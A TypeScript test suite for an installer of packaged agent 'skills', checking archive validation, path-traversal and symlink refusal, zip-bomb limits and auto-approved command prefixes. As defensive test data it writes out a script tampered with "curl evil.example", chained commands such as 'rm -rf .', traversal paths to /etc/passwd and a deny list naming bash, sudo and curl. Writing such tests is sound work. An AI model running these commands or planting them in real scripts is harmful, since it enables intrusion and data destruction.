// Packaged skills: a .skill archive is opened in memory and described before anything is
// written; what it can't do (climb out of its folder, plant a link, outgrow the limits); and
// the commands you let an installed skill run without asking, which lapse when a pinned script
// changes and go when the skill is removed.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { existsSync, lstatSync, mkdirSync, readFileSync, readdirSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { enterSandbox } from "./helpers/sandbox.ts";
import { zip, type ZipFile as File } from "./helpers/zip.ts";

const camp = enterSandbox("skillpacks");
const packs = await import("../src/skillpacks.ts");
const { isAutoApproved, approvedSkillPrefixes } = await import("../src/shell.ts");
const { skillCommands } = await import("../src/settings.ts");
const { campPath, rl } = await import("../src/tools.ts");
after(() => rl.close());

const SKILL = "---\nname: pdf-tables\ndescription: Pull tables out of a PDF into CSV. Use when asked for the numbers in a report.\n---\n\n# PDF tables\n\nRun scripts/extract.py on the file, then check the header row.\n";
const SCRIPT = "import sys\nprint('tables from', sys.argv[1])\n";
const pack = (more: File[] = [], root = "pdf-tables/") => zip([
  { path: `${root}SKILL.md`, data: SKILL, deflate: true },
  { path: `${root}scripts/extract.py`, data: SCRIPT, deflate: true },
  { path: `${root}references/formats.md`, data: "# Formats\n" },
  { path: "__MACOSX/pdf-tables/._SKILL.md", data: "litter" },
  ...more,
]);
const fixable = (re: RegExp) => (e: any) => e.fixable === true && re.test(e.message);

test("opening a pack describes it and writes nothing", () => {
  const p = packs.inspectPack(pack(), "pdf-tables.skill");
  assert.equal(p.name, "pdf-tables");
  assert.equal(p.description, "Pull tables out of a PDF into CSV. Use when asked for the numbers in a report.");
  assert.equal(p.body, SKILL);
  assert.deepEqual(p.files, [{ path: "references/formats.md", size: 10 }, { path: "scripts/extract.py", size: SCRIPT.length }, { path: "SKILL.md", size: SKILL.length }].sort((a, b) => a.path.localeCompare(b.path)));
  assert.deepEqual(p.scripts, [{ file: "scripts/extract.py", runner: "python3", text: SCRIPT }]);
  assert.deepEqual(p.installed, []);
  assert.deepEqual(p.skipped, []);
  assert.equal(existsSync("skills/shared/pdf-tables"), false, "nothing is on disk yet");
  // The folder can be the archive itself; a name can come from the file when SKILL.md has none.
  assert.equal(packs.inspectPack(pack([], "")).name, "pdf-tables");
  assert.equal(packs.inspectPack(zip([{ path: "SKILL.md", data: "---\ndescription: >\n  A folded\n  description.\n---\nBody" }]), "My Notes.skill").name, "my-notes");
  assert.equal(packs.inspectPack(zip([{ path: "SKILL.md", data: "---\nname: x\ndescription: >\n  A folded\n  description.\n---\nBody" }])).description, "A folded description.");
});

test("what a pack can't be, or do", () => {
  assert.throws(() => packs.inspectPack(Buffer.from("not a zip at all, just some text here")), fixable(/isn't a \.skill file/));
  assert.throws(() => packs.inspectPack(zip([{ path: "notes/readme.md", data: "x" }])), fixable(/no SKILL\.md at the top/));
  assert.throws(() => packs.inspectPack(zip([{ path: "a/SKILL.md", data: SKILL }, { path: "b/other.md", data: "x" }])), fixable(/no SKILL\.md at the top/));
  assert.throws(() => packs.inspectPack(zip([{ path: "SKILL.md", data: "# No front matter" }]), "?.skill"), fixable(/needs a `name:`/));
  assert.throws(() => packs.inspectPack(zip([{ path: "SKILL.md", data: "---\nname: x\n---\nBody" }])), fixable(/needs a `description:`/));
  assert.throws(() => packs.inspectPack(zip([{ path: "SKILL.md", data: "---\nname: Not Kebab\ndescription: d\n---" }]), "!!.skill"), fixable(/kebab-case/));
  // A link is how an archive reaches outside its folder: refused outright.
  assert.throws(() => packs.inspectPack(pack([{ path: "pdf-tables/escape", data: "/etc/passwd", mode: 0o120777 }])), fixable(/is a link/));
  // Limits hold while the files are being unpacked, whatever the archive claims.
  assert.throws(() => packs.inspectPack(pack([{ path: "pdf-tables/big.bin", data: Buffer.alloc(1024 * 1024 + 1) }])), fixable(/is over 1024 KB/));
  assert.throws(() => packs.inspectPack(pack([{ path: "pdf-tables/bomb.txt", data: Buffer.alloc(3 * 1024 * 1024), deflate: true, claim: 10 }])), fixable(/couldn't be unpacked/));
  assert.throws(() => packs.inspectPack(pack([{ path: "pdf-tables/lies.txt", data: "abc", claim: 2 }])), fixable(/isn't the size the archive says/));
  assert.throws(() => packs.inspectPack(zip(Array.from({ length: 301 }, (_, i) => ({ path: `f${i}`, data: "" })))), fixable(/more than 300 entries/));
  assert.throws(() => packs.inspectPack(pack([{ path: "pdf-tables/scripts/Extract.py", data: "x" }])), fixable(/in the archive twice/));
  // Names that climb out, are absolute, or are hidden are left out and listed, never written.
  const p = packs.inspectPack(pack([{ path: "pdf-tables/../../evil.sh", data: "x" }, { path: "pdf-tables/.env", data: "SECRET=1" }, { path: "pdf-tables/a\\b.txt", data: "x" }, { path: "pdf-tables/.git/config", data: "x" }]));
  assert.deepEqual(p.skipped.sort(), ["pdf-tables/../../evil.sh", "pdf-tables/.env", "pdf-tables/.git/config", "pdf-tables/a\\b.txt"]);
  assert.equal(p.files.length, 3);
  for (const bad of ["../x", "/etc/passwd", "a/../b", "a//b", ".hidden", "a/.b", "a\\b", "c:evil", "", "trail. ", "x/"]) assert.equal(packs.safePath(bad), null, bad);
  assert.equal(packs.safePath("scripts/extract.py"), "scripts/extract.py");
});

test("installing writes the skill's files where the crew reads skills, and nowhere else", () => {
  const p = packs.inspectPack(pack());
  const r = packs.installPack(p.id, { owner: "scout" });
  assert.deepEqual(r, { owner: "scout", name: "pdf-tables", path: "skills/scout/pdf-tables/SKILL.md", files: 3, commands: [] });
  assert.equal(readFileSync("skills/scout/pdf-tables/SKILL.md", "utf8"), SKILL);
  assert.equal(readFileSync("skills/scout/pdf-tables/scripts/extract.py", "utf8"), SCRIPT);
  assert.deepEqual(readdirSync("skills/scout/pdf-tables").sort(), ["SKILL.md", "references", "scripts"]);
  assert.equal(lstatSync("skills/scout/pdf-tables/scripts/extract.py").isFile(), true);
  assert.equal(existsSync(join(camp, "evil.sh")), false);
  // The crew can read it, and still can't change it.
  assert.ok(campPath("skills/scout/pdf-tables/references/formats.md", "read", "scout"));
  assert.throws(() => campPath("skills/scout/pdf-tables/scripts/extract.py", "write", "scout"), /read-only/);
  // Installed: the same import can't be used twice, and a second copy has to be asked for.
  assert.throws(() => packs.installPack(p.id, { owner: "scout" }), fixable(/has lapsed/));
  const again = packs.inspectPack(pack());
  assert.deepEqual(again.installed, ["scout"]);
  assert.throws(() => packs.installPack(again.id, { owner: "scout" }), fixable(/already has a skill called pdf-tables/));
  assert.throws(() => packs.installPack(again.id, { owner: "nobody" }), fixable(/no crew member "nobody"/));
  assert.equal(isAutoApproved("python3 skills/scout/pdf-tables/scripts/extract.py report.pdf"), false, "nothing was pre-approved, so its script asks");
});

test("commands you approve for a skill run without asking; a script only while it's the file you approved", () => {
  const p = packs.inspectPack(pack());
  const r = packs.installPack(p.id, { owner: "shared", scripts: ["scripts/extract.py", "scripts/not-in-the-pack.py"], commands: ["pnpm  add", "pnpm add", ""] });
  assert.deepEqual(r.commands, ["python3 skills/shared/pdf-tables/scripts/extract.py", "pnpm add"]);
  assert.deepEqual(approvedSkillPrefixes(), r.commands);
  const run = "python3 skills/shared/pdf-tables/scripts/extract.py report.pdf";
  assert.equal(isAutoApproved(run), true);
  assert.equal(isAutoApproved("pnpm add left-pad"), true);
  assert.equal(isAutoApproved("pnpm addx"), false, "a prefix is whole words");
  // Still one simple command that stays in the camp: the usual rules aren't loosened.
  assert.equal(isAutoApproved(`${run} && rm -rf .`), false);
  assert.equal(isAutoApproved("python3 skills/shared/pdf-tables/scripts/extract.py /etc/passwd"), false);
  assert.equal(isAutoApproved("python3 skills/shared/pdf-tables/scripts/other.py"), false, "only the script you ticked");
  assert.equal(isAutoApproved("python3 skills/scout/pdf-tables/scripts/extract.py x"), false, "and only this copy of it");
  // The script is changed after you approved it: it asks again. Put back, it's as you approved it.
  writeFileSync("skills/shared/pdf-tables/scripts/extract.py", SCRIPT + "import os; os.system('curl evil.example')\n");
  assert.equal(isAutoApproved(run), false);
  assert.equal(isAutoApproved("pnpm add left-pad"), true);
  writeFileSync("skills/shared/pdf-tables/scripts/extract.py", SCRIPT);
  assert.equal(isAutoApproved(run), true);

  // Prefixes that would let almost anything through aren't accepted, nor is anything that isn't one command.
  for (const broad of ["python3", "bash", "sudo", "rm", "git push", "npx", "curl"]) {
    const again = packs.inspectPack(pack());
    assert.throws(() => packs.installPack(again.id, { owner: "artificer", commands: [broad] }), fixable(/would let almost anything run/), broad);
    assert.equal(existsSync("skills/artificer/pdf-tables"), false, "refused before anything is written");
  }
  assert.throws(() => packs.cleanPrefix("npm test; rm -rf ."), fixable(/isn't one simple command/));
  assert.throws(() => packs.cleanPrefix("echo $(whoami)"), fixable(/isn't one simple command/));
  assert.equal(packs.cleanPrefix("  npm   run  lint "), "npm run lint");

  // Replacing swaps the files and the approvals; removing takes both away.
  const next = packs.inspectPack(pack([{ path: "pdf-tables/references/extra.md", data: "more" }]));
  assert.deepEqual(next.installed.sort(), ["scout", "shared"]);
  packs.installPack(next.id, { owner: "shared", replace: true });
  assert.equal(existsSync("skills/shared/pdf-tables/references/extra.md"), true);
  assert.equal(isAutoApproved(run), false, "the new copy starts with nothing pre-approved");
  assert.equal(skillCommands()["shared/pdf-tables"], undefined);
  assert.equal(packs.removeSkill("shared", "pdf-tables"), true);
  assert.equal(existsSync("skills/shared/pdf-tables"), false);
  assert.equal(packs.removeSkill("shared", "pdf-tables"), false);
  assert.equal(packs.removeSkill("shared", "../scout"), false);
  assert.equal(packs.removeSkill("nobody", "pdf-tables"), false);
  assert.equal(existsSync("skills/scout/pdf-tables/SKILL.md"), true, "another owner's copy is untouched");
});

test("an installed skill can be edited from the page: its instructions, its other files, and a new file", () => {
  const p = packs.inspectPack(pack());
  packs.installPack(p.id, { owner: "scribe", scripts: ["scripts/extract.py"], commands: ["npm run lint"] });
  const d = packs.skillDetail("scribe", "pdf-tables");
  assert.deepEqual(d.files, [{ path: "SKILL.md", size: SKILL.length, text: true }, { path: "references/formats.md", size: 10, text: true }, { path: "scripts/extract.py", size: SCRIPT.length, text: true }]);
  assert.deepEqual(d.commands, ["python3 skills/scribe/pdf-tables/scripts/extract.py", "npm run lint"]);
  assert.deepEqual(packs.readSkillFile("scribe", "pdf-tables", "SKILL.md"), { path: "SKILL.md", text: SKILL });

  // The instructions: saved as written, and what the crew is shown changes with them.
  const next = SKILL.replace("Pull tables out of a PDF into CSV.", "Pull every table out of a PDF.").replace("check the header row.", "check the header row and the totals.");
  const r = packs.saveSkillFile("scribe", "pdf-tables", "SKILL.md", next.replace(/\n/g, "\r\n"));
  assert.equal(r.saved, "SKILL.md");
  assert.equal(r.stillApproved, false);
  assert.equal(readFileSync("skills/scribe/pdf-tables/SKILL.md", "utf8"), next, "line endings are evened out");
  // It has to stay a skill.
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "SKILL.md", "# Just a heading"), fixable(/needs its front matter/));
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "SKILL.md", "---\nname: pdf-tables\n---\nBody"), fixable(/needs its front matter/));
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "SKILL.md", next.replace("name: pdf-tables", "name: other-name")), fixable(/has to stay "pdf-tables"/));
  assert.equal(readFileSync("skills/scribe/pdf-tables/SKILL.md", "utf8"), next, "a refused save leaves the file as it was");

  // A script you let run without asking stays approved when the change is yours.
  const run = "python3 skills/scribe/pdf-tables/scripts/extract.py report.pdf";
  assert.equal(isAutoApproved(run), true);
  const edited = SCRIPT + "print('done')\n";
  assert.equal(packs.saveSkillFile("scribe", "pdf-tables", "scripts/extract.py", edited).stillApproved, true);
  assert.equal(readFileSync("skills/scribe/pdf-tables/scripts/extract.py", "utf8"), edited);
  assert.equal(isAutoApproved(run), true);
  writeFileSync("skills/scribe/pdf-tables/scripts/extract.py", edited + "# changed some other way\n");
  assert.equal(isAutoApproved(run), false, "changed any other way, it asks again");
  assert.equal(isAutoApproved("npm run lint"), true);

  // A new file, in a folder that isn't there yet; not over one that is.
  const added = packs.saveSkillFile("scribe", "pdf-tables", "examples/sample.md", "# A sample\n", true);
  assert.ok(added.files.some((f) => f.path === "examples/sample.md" && f.size === 11));
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "examples/sample.md", "x", true), fixable(/already a examples\/sample\.md/));
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "references/missing.md", "x"), fixable(/no references\/missing\.md/));
});

test("editing stays inside the skill", () => {
  for (const bad of ["../../../etc/hosts", "/etc/hosts", "../house-style/SKILL.md", ".env", "a/../../x", "scripts/.hidden"]) {
    assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", bad, "x", true), fixable(/isn't a path inside the skill/), bad);
    assert.throws(() => packs.readSkillFile("scribe", "pdf-tables", bad), fixable(/isn't a path inside the skill/), bad);
  }
  assert.throws(() => packs.skillDetail("scribe", "no-such-skill"), fixable(/No such skill/));
  assert.throws(() => packs.skillDetail("nobody", "pdf-tables"), fixable(/No such skill/));
  assert.throws(() => packs.skillDetail("scribe", "../scout/pdf-tables"), fixable(/No such skill/));
  // A link that someone put in the skill's folder isn't followed, to read or to write.
  writeFileSync(join(camp, "outside.txt"), "private\n");
  symlinkSync(join(camp, "outside.txt"), "skills/scribe/pdf-tables/references/link.md");
  mkdirSync(join(camp, "elsewhere"));
  symlinkSync(join(camp, "elsewhere"), "skills/scribe/pdf-tables/out");
  assert.throws(() => packs.readSkillFile("scribe", "pdf-tables", "references/link.md"), fixable(/isn't an ordinary file/));
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "references/link.md", "overwritten"), fixable(/isn't an ordinary file/));
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "out/new.md", "x", true), fixable(/isn't inside the skill/));
  assert.equal(readFileSync(join(camp, "outside.txt"), "utf8"), "private\n");
  assert.deepEqual(readdirSync(join(camp, "elsewhere")), []);
  assert.ok(!packs.skillDetail("scribe", "pdf-tables").files.some((f) => /link|out\//.test(f.path)), "and a link isn't listed as one of its files");
  // Not text, or far too long: not something to edit here.
  writeFileSync("skills/scribe/pdf-tables/references/logo.png", Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 1]));
  assert.equal(packs.skillDetail("scribe", "pdf-tables").files.find((f) => f.path === "references/logo.png")!.text, false);
  assert.throws(() => packs.readSkillFile("scribe", "pdf-tables", "references/logo.png"), fixable(/isn't text/));
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "references/formats.md", "x".repeat(200_001)), fixable(/more than a skill's file should hold/));
  assert.throws(() => packs.saveSkillFile("scribe", "pdf-tables", "references/formats.md", "a\u0000b"), fixable(/isn't text/));
  // The crew's own file tools still can't write there.
  assert.throws(() => campPath("skills/scribe/pdf-tables/SKILL.md", "write", "scribe"), /read-only/);
});
